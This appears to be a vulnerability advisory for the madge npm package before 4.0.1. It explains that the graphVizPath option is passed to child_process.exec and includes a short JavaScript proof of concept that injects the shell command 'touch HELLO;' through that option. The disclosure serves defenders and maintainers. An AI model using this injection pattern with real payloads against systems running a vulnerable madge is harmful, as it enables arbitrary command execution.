summary: "Madge vulnerable to command injection\nThis affects the package madge before 4.0.1.\
  \ It is possible to specify a custom Graphviz path via the graphVizPath option parameter which,\
  \ when the .image(), .svg() or .dot() functions are called, is executed by the childprocess.exec\
  \ function.\n\n### PoC\n```js\nconst madge = require('madge'); \nmadge('..', {graphVizPath:\
  \ \"touch HELLO;\"}) .then((res) => res.svg()) .then((writtenImagePath) => { console.log('Image\
  \ written to ' + writtenImagePath); });\n```"
